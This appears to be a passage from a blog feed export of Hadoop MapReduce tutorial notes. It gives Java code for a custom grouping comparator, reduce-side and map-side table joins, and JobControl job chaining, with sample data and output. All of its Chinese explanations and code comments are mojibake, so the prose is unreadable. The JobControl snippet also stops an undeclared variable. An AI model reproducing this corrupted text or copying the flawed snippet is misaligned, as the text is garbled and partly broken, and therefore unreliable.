æ­¤æ—¶æ˜¯æŒ‰ç…§è¯¾ç¨‹åˆ†å¥½ç»„äº†, åŒä¸€ä¸ªè¯¾ç¨‹çš„æ‰€æœ‰å­¦ç”Ÿéƒ½è¿‡æ¥äº†, å¹¶ä¸”å­¦ç”Ÿæˆç»©æ˜¯æ’å¥½çš„, * å¦‚æœæ­¤æ—¶æ±‚æœ€å¤§å€¼, åªéœ€è¦å–å‡ºç¬¬ä¸€ä¸ªå³å¯ */ // è¿›æ¥ä¸€æ¬¡åªå–ç¬¬ä¸€ä¸ª Text name = values.iterator().next(); k.set(key.getCourseName() + "\t" + name.toString() + "\t" + key.getScore()); context.write(k, NullWritable.get()); context.write(new Text("==================ç¬¬"+count+"æ¬¡è¿›å…¥reduce"), NullWritable.get()); /*context.write(new Text("==================ç¬¬"+count+"æ¬¡è¿›å…¥reduce"), NullWritable.get()); for (Text name : values) &#123; k.set(key.getCourseName() + "\t" + name.toString() + "\t" + key.getScore()); context.write(k, NullWritable.get()); context.write(new Text("---------in for write------"), NullWritable.get()); &#125;*/ count++; &#125; &#125;&#125;ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ MyGrouper ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿/** * @author shixuanji * è‡ªå®šä¹‰åˆ†ç»„ éœ€è¦ç»§æ‰¿ä¸€ä¸ªç±»WritableComparator * é‡å†™compareæ–¹æ³• */class MyGrouper extends WritableComparator &#123; // WritableComparator æ­¤æ–¹æ³•çš„é»˜è®¤æ— å‚æ„é€ æ˜¯ä¸ä¼šåˆ›å»ºå¯¹è±¡çš„, éœ€è¦è‡ªå·±é‡å†™ public MyGrouper() &#123; // ä¸­é—´çœå»çš„å‚æ•°æ˜¯ Configuration, å¦‚æœä¸ºç©º, ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ super(ScoreBean2.class, true); &#125; /** * æ­¤å¤„æ¯”è¾ƒçš„æ˜¯2ä¸ª WritableComparable å¯¹è±¡, éœ€è¦å¼ºè½¬ä¸€ä¸‹å…·ä½“çš„ç±»å¯¹è±¡ */ @SuppressWarnings("rawtypes") @Override public int compare(WritableComparable a, WritableComparable b) &#123; ScoreBean2 aBean = (ScoreBean2) a; ScoreBean2 bBean = (ScoreBean2) b; // è¿”å›åˆ†ç»„è§„åˆ™ System.out.println(aBean.getCourseName()+"---MyGroupä¸­æ¯”è¾ƒ---"+(bBean.getCourseName())); return aBean.getCourseName().compareTo(bBean.getCourseName()); &#125;&#125;================================================================================ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ æ‰§è¡Œç»“æœ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿================================================================================algorithm huangjiaju 82.28571428571429==================ç¬¬1æ¬¡è¿›å…¥reducecomputer huangjiaju 83.2==================ç¬¬2æ¬¡è¿›å…¥reduceenglish huanglei 83.0==================ç¬¬3æ¬¡è¿›å…¥reducemath huangxiaoming 83.0==================ç¬¬4æ¬¡è¿›å…¥reduce MRå®ç°ä¸¤ä¸ªè¡¨çš„æ•°æ®å…³è”Joiné¢˜ç›® è®¢å•æ•°æ®è¡¨t_orderï¼š flag=0id date pid amount1001 20150710 P0001 21002 20150710 P0001 31003 20150710 P0002 3Id:æ•°æ®è®°å½•idDate æ—¥æœŸPid å•†å“idAmount åº“å­˜æ•°é‡ 6.å•†å“ä¿¡æ¯è¡¨t_product flag=1pid name category_id priceP0001 å°ç±³5 C01 2000P0002 é”¤å­T1 C01 3500 mrå®ç°ä¸¤ä¸ªè¡¨çš„æ•°æ®å…³è”id pid date amount name category_id price ç­”æ¡ˆ1 : Reducer ç«¯ å®ç° Joinæ€è·¯ mapç«¯ è¯»å–åˆ°å½“å‰è·¯å¾„ä¸‹ï¼Œæ‰€æœ‰æ–‡ä»¶çš„åˆ‡ç‰‡ä¿¡æ¯ï¼Œ æ ¹æ®æ–‡ä»¶ååˆ¤æ–­æ˜¯é‚£å¼ è¡¨ åœ¨setupä¸­ï¼Œä»æ–‡ä»¶åˆ‡ç‰‡ä¸­è·å–åˆ°æ–‡ä»¶å 123456// è·å–è¯»å–åˆ°çš„åˆ‡ç‰‡ç›¸å…³ä¿¡æ¯,ä¸€ä¸ªåˆ‡ç‰‡å¯¹åº”ä¸€ä¸ª maptaskInputSplit inputSplit = context.getInputSplit();// è½¬æ¢ä¸ºæ–‡ä»¶åˆ‡ç‰‡FileSplit fs = (FileSplit)inputSplit;// è·å–æ–‡ä»¶åfilename = fs.getPath().getName(); è¿™é‡Œæ€»å…±ä¼šè·å¾—2ä¸ªæ–‡ä»¶åï¼ˆæŒ‡å®šç›®å½•å­˜äº†2ä¸ªæŒ‡å®šæ–‡ä»¶ï¼‰ï¼Œä¸€ä¸ªæ–‡ä»¶åå¯¹åº”ä¸€ä¸ªåˆ‡ç‰‡ å…³è”å­—æ®µä½œä¸ºkeyï¼Œ å…¶å®ƒçš„ä½œä¸ºvalueï¼Œåœ¨valueå‰é¢åŠ ä¸Šå½“å‰æ–‡ä»¶çš„åç§°æ ‡è®° reduceç«¯ é€šè¿‡æ ‡è®°åŒºåˆ†ä¸¤å¼ è¡¨ï¼ŒæŠŠè¯»å–åˆ°çš„ä¿¡æ¯ï¼Œåˆ†åˆ«å­˜å…¥2ä¸ªlistä¸­ éå†å¤§çš„è¡¨ï¼Œä¸å°è¡¨è¿›è¡Œæ‹¼æ¥ï¼ˆå°è¡¨çš„ç›¸åŒpidè®°å½•åªä¼šæœ‰ä¸€æ¡ï¼‰ æ‹¼æ¥å®Œæˆåå³å¯å†™å‡º ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161package com.rox.mapreduce.mr3._03_join2è¡¨çš„æ•°æ®å…³è”;import java.io.IOException;import java.util.ArrayList;import java.util.List;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.InputSplit;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.input.FileSplit;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class ReduceJoinDemo &#123; public static void main(String[] args) throws Exception &#123; // æŒ‡å®šHDFSç›¸å…³å‚æ•° Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); // ï£¿ åˆ›å»º/é…ç½® Job Job job = Job.getInstance(conf); // è®¾ç½®JaråŒ…ç±»å‹ job.setJarByClass(ReduceJoinDemo.class); // è®¾ç½®Map Reduceæ‰§è¡Œç±» job.setMapperClass(MyMapper.class); job.setReducerClass(MyReducer.class); // è®¾ç½®Mapè¾“å‡ºç±» job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(Text.class); // Reduceè¾“å‡ºç±» job.setOutputKeyClass(Text.class); job.setOutputValueClass(NullWritable.class); // è®¾ç½®è¾“å…¥ è¾“å‡ºè·¯å¾„ String inP = "/in/joindemo"; String outP = "/out/joinout1"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); // è®¾ç½®å¦‚æœå­˜åœ¨è·¯å¾„å°±åˆ é™¤ Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; // ï£¿ æ‰§è¡Œjob boolean waitForCompletion = job.waitForCompletion(true); System.exit(waitForCompletion?0:-1); &#125; /** * @author shixuanji * æ€è·¯: è¯»å–2ä¸ªè¡¨ä¸­çš„æ•°æ®,è¿›è¡Œæ ‡è®°å‘é€ * key: ä¸¤è¡¨éœ€è¦å…³è”çš„å­—æ®µ * value: å…¶å®ƒå€¼, éœ€è¦æ ‡è®°ï¼Œ æ ‡è®°æ•°æ®çš„æ¥æº * * * **æ ¸å¿ƒï¼š å…³è”æ¡ä»¶** - æƒ³è¦åœ¨ reduce ç«¯å®Œæˆ joinï¼Œ è¦åœ¨ reduce ç«¯å¯ä»¥åŒæ—¶æ¥æ”¶åˆ°ä¸¤ä¸ªè¡¨ä¸­çš„æ•°æ® - è¦ä¿è¯åœ¨ Map ç«¯è¿›è¡Œè¯»æ–‡ä»¶çš„æ—¶å€™ï¼Œ è¯»åˆ°2ä¸ªè¡¨çš„æ•°æ®ï¼Œ å¹¶ä¸”éœ€è¦å¯¹2ä¸ªè¡¨çš„æ•°æ®è¿›è¡ŒåŒºåˆ† - å°†2ä¸ªè¡¨æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ è§£å†³: mapper å¼€å§‹æ‰§è¡Œæ—¶, åœ¨setupæ–¹æ³•ä¸­, ä»ä¸Šä¸‹æ–‡ä¸­å–åˆ°æ–‡ä»¶å, æ ¹æ®æ–‡ä»¶åæ‰“æ ‡è®° */ static class MyMapper extends Mapper&lt;LongWritable, Text, Text, Text&gt; &#123; String filename = ""; Text k = new Text(); Text v = new Text(); @Override protected void setup( Mapper&lt;LongWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; // è·å–è¯»å–åˆ°çš„åˆ‡ç‰‡ç›¸å…³ä¿¡æ¯,ä¸€ä¸ªåˆ‡ç‰‡å¯¹åº”ä¸€ä¸ª maptask InputSplit inputSplit = context.getInputSplit(); // è½¬æ¢ä¸ºæ–‡ä»¶åˆ‡ç‰‡ FileSplit fs = (FileSplit)inputSplit; // è·å–æ–‡ä»¶å filename = fs.getPath().getName(); System.out.println("æœ¬æ¬¡è·å–åˆ°çš„æ–‡ä»¶åä¸º-----"+filename); &#125; @Override protected void map(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; // è§£æå‡ºæ¥æ¯ä¸€è¡Œå†…å®¹, æ‰“æ ‡è®°, å‘é€ String[] infos = value.toString().split("\t"); if (filename.equals("order")) &#123; k.set(infos[2]); // è®¾ç½®æ ‡è®°å‰ç¼€ä¸º OR v.set("OR"+infos[0]+"\t"+infos[1]+"\t"+infos[3]); &#125;else &#123; k.set(infos[0]); // è®¾ç½®æ ‡è®°å‰ç¼€ä¸º PR v.set("PR"+infos[1]+"\t"+infos[2]+"\t"+infos[3]); &#125; context.write(k, v); &#125; &#125; static class MyReducer extends Reducer&lt;Text, Text, Text, NullWritable&gt; &#123; Text k = new Text(); @Override protected void reduce(Text key, Iterable&lt;Text&gt; values, Reducer&lt;Text, Text, Text, NullWritable&gt;.Context context) throws IOException, InterruptedException &#123; /** * é¦–å…ˆæ˜ç¡® product å’Œ order æ˜¯ ä¸€å¯¹å¤šçš„å…³ç³» * æ ¹æ®å‰ç¼€ä¸åŒ,å–åˆ°2ä¸ªä¸åŒçš„è¡¨å­˜è¿›2ä¸ªå®¹å™¨ä¸­ * éå†å¤šçš„è¡¨, ä¸ä¸€è¿›è¡Œæ‹¼æ¥ * æœ€åå†™å‡ºåˆ°ä¸Šä¸‹æ–‡ * æœ€ç»ˆçš„è¾“å‡ºæ ¼å¼ id pid date amount name category_id price */ // å› ä¸ºæ¯æ¬¡éå†åˆ°ä¸åŒçš„pid, éƒ½ä¼šèµ°è¿›æ¥ä¸€æ¬¡, listä¹Ÿä¼šæœ‰æ–°çš„è¾“å‡º,æ‰€ä»¥å¿…é¡»å®šä¹‰åœ¨é‡Œé¢,æ¯æ¬¡è¿›æ¥éƒ½è¦åˆå§‹åŒ– List&lt;String&gt; productList =new ArrayList&lt;&gt;(); List&lt;String&gt; orderList =new ArrayList&lt;&gt;(); for (Text v : values) &#123; String vStr = v.toString(); if (vStr.startsWith("OR")) &#123; orderList.add(vStr.substring(2)); &#125;else &#123; productList.add(vStr.substring(2)); &#125; &#125; // æ­¤æ—¶2ä¸ªlistæ·»åŠ å®Œäº†æœ¬æ¬¡ ç›¸åŒçš„ key(pid) çš„æ‰€æœ‰å•†å“ // éå†å¤šçš„è¿›è¡Œæ‹¼æ¥ for (String or : orderList) &#123; // ç›¸åŒçš„ pidçš„ product åªæœ‰ä¸€ä¸ª, productListä¸­çš„æ•°é‡æ˜¯1 // ä½†æ˜¯ç›¸åŒpid çš„ è®¢å• å¯èƒ½æœ‰å¤šä¸ª String res = key.toString() + "\t" + or + productList.get(0); k.set(res); context.write(k, NullWritable.get()); &#125; &#125; &#125;&#125; â€» ç­”æ¡ˆ2 ï¼š Mapper ç«¯å®ç° Join â€»æ€è·¯ åˆ›å»ºjobçš„æ—¶å€™,æŠŠå°è¡¨åŠ å…¥ç¼“å­˜ åœ¨mapçš„setupä¸­, è¯»å–ç¼“å­˜ä¸­çš„æ•°æ®, å­˜å…¥ä¸€ä¸ªæˆå‘˜å˜é‡ mapä¸­ mapæ–¹æ³•ä¸­,åªéœ€è¦è¯»ä¸€ä¸ªè¡¨, ç„¶åæ ¹æ®å…³è”æ¡ä»¶(å…³è”key: pid)æ¶ˆé™¤ç¬›å¡å°”é›†,è¿›è¡Œæ‹¼æ¥ mapç›´æ¥è¾“å‡º, ç”šè‡³éƒ½ä¸éœ€è¦reduce æ³¨æ„ç‚¹: éœ€è¦è¾¾æˆjaråŒ…è¿è¡Œ, ç›´æ¥ç”¨Eclipseä¼šæ‰¾ä¸åˆ°ç¼“å­˜ jaråŒ…æ‰§è¡Œæ–¹æ³• 12# å¦‚æœä»£ç å†…éƒ¨æŒ‡å®šäº†è¾“å…¥è¾“å‡ºè·¯å¾„ï¼Œåé¢çš„/inï¼Œ/outå‚æ•°å¯ä»¥ä¸åŠ hadoop jar xxxx.jar com.rox.xxx.xxxx(ä¸»æ–¹æ³•) /in/xx /out/xx å¦‚æœæ²¡æœ‰Reduceæ–¹æ³• mainæ–¹æ³•ä¸­ï¼Œè®¾ç½®mapçš„å†™å‡ºkeyï¼Œvalue,åº”è¯¥ç”¨ setOutputKeyClass 123//// è®¾ç½®Mapè¾“å‡ºç±» (å› ä¸ºè¿™é‡Œæ²¡æœ‰Reduce, æ‰€ä»¥è¿™é‡Œæ˜¯æœ€ç»ˆè¾“å‡º,ä¸€å®šè¦æ³¨æ„!!!)//////////job.setOutputKeyClass(Text.class);job.setOutputValueClass(NullWritable.class); è¦è®¾ç½®reduce task çš„ä¸ªæ•°ä¸º0 1job.setNumReduceTasks(0); æŠŠå°æ–‡ä»¶åŠ è½½åˆ°ç¼“å­˜ä¸­çš„æ–¹æ³• 12////////////// å°†å°æ–‡ä»¶åŠ è½½åˆ°ç¼“å­˜ job.addCacheFile(new URI("/in/joindemo/product")); â€‹ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120package com.rox.mapreduce.mr3._03_join;import java.io.BufferedReader;import java.io.FileReader;import java.io.IOException;import java.net.URI;import java.util.HashMap;import java.util.Map;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class MapJoinDemo &#123; public static void main(String[] args) throws Exception &#123; // æŒ‡å®šHDFSç›¸å…³å‚æ•° Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); // ï£¿ åˆ›å»º/é…ç½® Job Job job = Job.getInstance(conf); // è®¾ç½®JaråŒ…ç±»å‹:è¿™é‡Œåƒä¸‡åˆ«å†™é”™äº† job.setJarByClass(MapJoinDemo.class); // è®¾ç½®Map Reduceæ‰§è¡Œç±» job.setMapperClass(MyMapper.class); ///////////// è®¾ç½®Mapè¾“å‡ºç±» (å› ä¸ºè¿™é‡Œæ²¡æœ‰Reduce, æ‰€ä»¥è¿™é‡Œæ˜¯æœ€ç»ˆè¾“å‡º,ä¸€å®šè¦æ³¨æ„!!!)////////// job.setOutputKeyClass(Text.class); job.setOutputValueClass(NullWritable.class); ////////////// è®¾ç½®reduceæ‰§è¡Œä¸ªæ•°ä¸º0 job.setNumReduceTasks(0); ////////////// å°†å°æ–‡ä»¶åŠ è½½åˆ°ç¼“å­˜ job.addCacheFile(new URI("/in/joindemo/product")); // è®¾ç½®è¾“å…¥ è¾“å‡ºè·¯å¾„ String inP = "/in/joindemo/order"; String outP = "/out/joinout2"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); // è®¾ç½®å¦‚æœå­˜åœ¨è·¯å¾„å°±åˆ é™¤ Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; // ï£¿ æ‰§è¡Œjob System.exit(job.waitForCompletion(true)?0:-1); &#125; /** * @author shixuanji * æ€è·¯: * åˆ›å»ºjobçš„æ—¶å€™,æŠŠå°è¡¨åŠ å…¥ç¼“å­˜ * åœ¨mapçš„setupä¸­, è¯»å–ç¼“å­˜ä¸­çš„æ•°æ®, å­˜å…¥ä¸€ä¸ªæˆå‘˜å˜é‡ mapä¸­ * mapæ–¹æ³•ä¸­,åªéœ€è¦è¯»ä¸€ä¸ªè¡¨, ç„¶åæ ¹æ®å…³è”æ¡ä»¶(å…³è”key: pid)æ¶ˆé™¤ç¬›å¡å°”é›†,è¿›è¡Œæ‹¼æ¥ * ç›´æ¥è¾“å‡º, ç”šè‡³éƒ½ä¸éœ€è¦reduce * * æ³¨æ„ç‚¹: * éœ€è¦è¾¾æˆjaråŒ…è¿è¡Œ, ç›´æ¥ç”¨Eclipseä¼šæ‰¾ä¸åˆ°ç¼“å­˜ * æ ¼å¼: hadoop jaråŒ…æœ¬åœ°è·¯å¾„ jaråŒ…ä¸»æ–¹æ³•å…¨é™å®šå hadoopè¾“å…¥ hadoopè¾“å‡º */ static class MyMapper extends Mapper&lt;LongWritable, Text, Text, NullWritable&gt; &#123; // åˆ›å»ºè£…è½½å°è¡¨çš„map, keyå­˜å‚¨ å…³è”é”®, valueå­˜å…¶å®ƒ Map&lt;String, String&gt; proMap = new HashMap&lt;&gt;(); @Override protected void setup(Context context) throws IOException, InterruptedException &#123; // è·å–ç¼“å­˜ä¸­å­˜å‚¨çš„å°è¡¨ (ä¸€èˆ¬æ˜¯ ä¸€å¯¹å¤šä¸­çš„ ä¸€), å› ä¸ºåªå­˜äº†1ä¸ª,æ‰€ä»¥ç›´æ¥å–ç¬¬0ä¸ª Path path = context.getLocalCacheFiles()[0]; String pString = path.toString(); // å¼€å¯inæµ, BufferedReader é€è¡Œè¯»å–æ–‡ä»¶ BufferedReader br = new BufferedReader(new FileReader(pString)); String line = null; while ((line = br.readLine()) != null) &#123; // æˆåŠŸè¯»å–ä¸€è¡Œ String[] infos = line.split("\t"); // å­˜è¿›proMap proMap.put(infos[0], infos[1] + "\t" + infos[2] + "\t" + infos[3]); &#125;// br.close(); &#125; /** * ç›´æ¥ä»è·¯å¾„è¯»å–å¤§æ–‡ä»¶ */ Text k = new Text(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String[] infos = value.toString().split("\t"); String pid = infos[2]; //è¿›è¡Œå…³è” pidåˆ°mapä¸­åŒ¹é… å¦‚æœåŒ…å« è¯æ˜åŒ¹é…ä¸Šäº† // è‰¹, è¿™é‡Œpidä¹‹å‰åŠ äº† "", å¦ˆçš„,å½“ç„¶æ‰¾ä¸åˆ°å•¦!!! if (proMap.containsKey(pid)) &#123; String res = value.toString() + "\t" + proMap.get(pid); k.set(res); context.write(k, NullWritable.get()); &#125; &#125; &#125;&#125; title:ï£¿ï£¿ï£¿ï£¿ï£¿ æ‰§è¡Œæµç¨‹æ—¶åºå›¾ ï£¿ï£¿ï£¿ï£¿ï£¿ Mapper(map)->ScoreBean: k:ScoreBean(courseName,avgScore) Mapper(map)->ScoreBean: v:Text(stuName) Mapper(ScoreBean)->Reducer(MyGroup): courseæŒ‰å­—å…¸å‡åº Mapper(ScoreBean)->Reducer(MyGroup): courseå†…æˆç»©é™åº Reducer(MyGroup)->Reducer(reduce): æ ¹æ®è‡ªå®šä¹‰çš„åˆ†ç»„è§„åˆ™æŒ‰ç»„è¾“å‡º Reducer(MyGroup)->Reducer(reduce): ä¸€ç»„åªè°ƒç”¨reduceä¸€æ¬¡{"theme":"simple"} var code = document.getElementById("sequence-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value)); var diagram = Diagram.parse(code); diagram.drawSVG("sequence-0", options);]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduceç¬”è®°-3]]></title>
    <url>%2F2018%2F06%2F08%2FHadoop%2F2-MapReduce%2FMapReduce%E7%AC%94%E8%AE%B0-3%2F</url>
    <content type="text"><![CDATA[1.å¤š Job ä¸²è”1.æ¦‚å¿µå½“ç¨‹åºä¸­æœ‰å¤šä¸ª Jobï¼Œ å¹¶ä¸”å¤šä¸ª job ä¹‹é—´ç›¸äº’ä¾èµ–ï¼Œ a ï¼Œ job éœ€è¦ä¾èµ–å¦ä¸€ä¸ªbï¼Œjob çš„æ‰§è¡Œç»“æœæ—¶å€™ï¼Œ æ­¤æ—¶éœ€è¦ä½¿ç”¨å¤š job ä¸²è” 2. æ¶‰åŠåˆ°æ˜¨å¤©çš„å¾®åšæ±‚å…±åŒç²‰ä¸é¢˜ç›® A:B,C,D,F,E,OB:A,C,E,KC:F,A,D,ID:A,E,F,LE:B,C,D,M,LF:A,B,C,D,E,O,MG:A,C,D,E,FH:A,C,D,E,OI:A,OJ:B,OK:A,C,DL:D,E,FM:E,F,GO:A,H,I,J,K ä»¥ä¸Šæ˜¯æ•°æ®ï¼šA:B,C,D,F,E,Oè¡¨ç¤ºï¼šAç”¨æˆ· å…³æ³¨B,C,D,E,F,O æ±‚æ‰€æœ‰ä¸¤ä¸¤ç”¨æˆ·ä¹‹é—´çš„å…±åŒå…³æ³¨å¯¹è±¡ æ³¨æ„ è¦å†™2ä¸ªMapReduceï¼Œ å¼€å¯2ä¸ªjob åä¸€ä¸ªjobä¾èµ–äºå‰ä¸€ä¸ªçš„æ‰§è¡Œç»“æœ åä¸€ä¸ªjobçš„è¾“å…¥æ–‡ä»¶è·¯å¾„ï¼Œå°±æ˜¯å‰ä¸€ä¸ªjobçš„è¾“å‡ºè·¯å¾„ 2ä¸ªjobéœ€è¦æ·»åŠ ä¾èµ– ä»£ç å‚è€ƒç»ƒä¹ -ç¬¬ä¸€é¢˜-æ±‚å¾®åšå…±åŒå¥½å‹ å¤š Job ä¸²è”éƒ¨åˆ†ä»£ç  åŸºæœ¬çš„å†™åˆ°ä¸€èµ·ï¼Œ job1ï¼Œ job2 ç”¨JobControlå¯¹è±¡ç®¡ç†å¤š jobï¼Œ ä¼šå°†å¤šä¸ª job å½“åšä¸€ä¸ªç»„ä¸­çš„ job æäº¤ï¼Œ å‚æ•°æŒ‡çš„æ˜¯ç»„åï¼Œ éšæ„èµ· åŸç”Ÿçš„ job è¦è½¬ä¸ºå¯æ§åˆ¶çš„ job 123456789101112131415161718// åˆ›å»º JobControl ç»„JobControl jc = new JobControl("common_friend");// job æ‹¿å¥½é…ç½®ï¼Œ åŠ å…¥ ControlledJob ç®¡ç†, å˜æˆå¯æ§åˆ¶çš„ jobControlledJob ajob = new ControlledJob(job1.getConfiguration());ControlledJob bjob = new ControlledJob(job2.getConfiguration());// æ·»åŠ ä¾èµ–å…³ç³»bjob.addDependingJob(ajob); // æ·»åŠ  jobè¿› JCjc.addJob(ajob);jc.addJob(bjob);// å¯åŠ¨çº¿ç¨‹Thread jobControlTread = new Thread(jc);jobControlTread.start();// åœ¨çº¿ç¨‹å®Œæˆä¹‹åå…³é—­while(!jc.allFinished()) &#123; Thread.sleep(500);&#125;jobControl.stop(); 2. åˆ†ç»„ç»„ä»¶mapâ€“åˆ†ç»„â€“reduce reduce æ¥æ”¶åˆ°çš„æ•°æ®æ˜¯æŒ‰ç…§ map è¾“å‡ºçš„ key è¿›è¡Œåˆ†ç»„çš„, åˆ†ç»„çš„æ—¶å€™æŒ‰ç…§ key ç›¸åŒçš„æ—¶å€™ä¸ºä¸€ç»„, é»˜è®¤éƒ½å®ç°äº† WritableComparableæ¥å£ï¼Œ å…¶ä¸­çš„ compareToï¼ˆï¼‰æ–¹æ³•è¿”å›ä¸º0çš„æ—¶å€™ é»˜è®¤ä¸ºä¸€ç»„ï¼Œ è¿”å›ä¸ä¸º0ï¼Œ åˆ™åˆ†åˆ°ä¸‹ä¸€ç»„ è‡ªå®šä¹‰åˆ†ç»„ä½¿ç”¨åœºæ™¯ï¼š é»˜è®¤çš„æ•°æ®åˆ†ç»„ä¸èƒ½æ»¡è¶³éœ€æ±‚ ä¸€ã€æ•°æ®è§£é‡Š æ•°æ®å­—æ®µä¸ªæ•°ä¸å›ºå®šï¼šç¬¬ä¸€ä¸ªæ˜¯è¯¾ç¨‹åç§°ï¼Œæ€»å…±å››ä¸ªè¯¾ç¨‹ï¼Œcomputerï¼Œmathï¼Œenglishï¼Œalgorithmï¼Œç¬¬äºŒä¸ªæ˜¯å­¦ç”Ÿå§“åï¼Œåé¢æ˜¯æ¯æ¬¡è€ƒè¯•çš„åˆ†æ•° äºŒã€ç»Ÿè®¡éœ€æ±‚ï¼š1ã€ç»Ÿè®¡æ¯é—¨è¯¾ç¨‹çš„å‚è€ƒäººæ•°å’Œè¯¾ç¨‹å¹³å‡åˆ† 2ã€ç»Ÿè®¡æ¯é—¨è¯¾ç¨‹å‚è€ƒå­¦ç”Ÿçš„å¹³å‡åˆ†ï¼Œå¹¶ä¸”æŒ‰è¯¾ç¨‹å­˜å…¥ä¸åŒçš„ç»“æœæ–‡ä»¶ï¼Œè¦æ±‚ä¸€é—¨è¯¾ç¨‹ä¸€ä¸ªç»“æœæ–‡ä»¶ 3ã€æ±‚å‡ºæ¯é—¨è¯¾ç¨‹å‚è€ƒå­¦ç”Ÿæˆç»©æœ€é«˜å¹³å‡åˆ†çš„å­¦ç”Ÿçš„ä¿¡æ¯ï¼šè¯¾ç¨‹ï¼Œå§“åå’Œå¹³å‡åˆ† ç¬¬ä¸‰é¢˜ï¼š è¦æ±‚å°±æ˜¯åˆ†ç»„æ±‚æœ€å¤§å€¼ï¼Œ ä¸¤ä»¶äº‹æƒ…ï¼š åˆ†ç»„ï¼Œ æ’åºï¼ˆshuffleï¼‰ æ€»ç»“ï¼š 1ã€åˆ©ç”¨â€œç­çº§å’Œå¹³å‡åˆ†â€ä½œä¸º keyï¼Œå¯ä»¥å°† map é˜¶æ®µè¯»å–åˆ°çš„æ‰€æœ‰å­¦ç”Ÿæˆç»©æ•°æ®æŒ‰ç…§ç­çº§ å’Œæˆç»©æ’å€’åºï¼Œå‘é€åˆ° reduce 2ã€åœ¨ reduce ç«¯åˆ©ç”¨ GroupingComparator å°†ç­çº§ç›¸åŒçš„ kv èšåˆæˆç»„ï¼Œç„¶åå–ç¬¬ä¸€ä¸ªå³æ˜¯æœ€ å¤§å€¼ å…·ä½“å‚è€ƒï¼šç»ƒä¹ -æ±‚å­¦ç”Ÿæˆç»©-ç¬¬ä¸‰å°é¢˜ 3. Reduce ä¸­çš„2ä¸ªå‘å‘1Iterable\åªèƒ½å¾ªç¯éå†ä¸€æ¬¡ è¿­ä»£å™¨æ¯æ¬¡å¾ªç¯éå†å®Œæˆï¼Œ æŒ‡é’ˆéƒ½ä¼šç§»åŠ¨åˆ°æœ€åä¸€ä¸ª ç³»ç»Ÿç±»å‹ï¼Œæ²¡äº‹ è‡ªå®šä¹‰ç±»å‹ ï¼Œæœ‰é—®é¢˜ï¼Ÿ å‘2è¿­ä»£å™¨ä¸­æ‰€æœ‰å¯¹è±¡å…¬ç”¨åŒä¸€ä¸ªåœ°å€ 4. Reduce ç«¯çš„ Joinç‰ºç‰²æ•ˆç‡æ¢æ‰§è¡Œ æ€è·¯ï¼š æ ¸å¿ƒï¼š å…³è”æ¡ä»¶ æƒ³è¦åœ¨ reduce ç«¯å®Œæˆ joinï¼Œ è¦åœ¨ reduce ç«¯å¯ä»¥åŒæ—¶æ¥æ”¶åˆ°ä¸¤ä¸ªè¡¨ä¸­çš„æ•°æ® è¦ä¿è¯åœ¨ Map ç«¯è¿›è¡Œè¯»æ–‡ä»¶çš„æ—¶å€™ï¼Œ è¯»åˆ°2ä¸ªè¡¨çš„æ•°æ®ï¼Œ å¹¶ä¸”éœ€è¦å¯¹2ä¸ªè¡¨çš„æ•°æ®è¿›è¡ŒåŒºåˆ† 